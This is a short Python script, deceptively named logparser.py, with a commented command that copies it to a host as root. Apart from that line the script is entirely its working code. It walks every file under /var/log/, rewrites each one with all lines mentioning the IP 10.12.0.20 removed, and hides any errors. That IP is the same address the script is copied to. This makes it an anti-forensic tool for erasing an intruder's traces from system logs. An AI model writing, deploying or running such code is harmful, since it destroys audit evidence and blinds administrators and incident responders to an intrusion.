#scp logparser.py root@10.12.0.20:/
import os
def log_check(file_path, ip):
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
        with open(file_path, 'w') as file:
            for line in lines:
                if ip not in line:
                    file.write(line)
    except Exception as e:
        pass

def traverse_directory(directory, ip):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            log_check(file_path, ip)

if __name__ == "__main__":
    directory_path = "/var/log/"
    ip = "10.12.0.20"
    traverse_directory(directory_path, ip)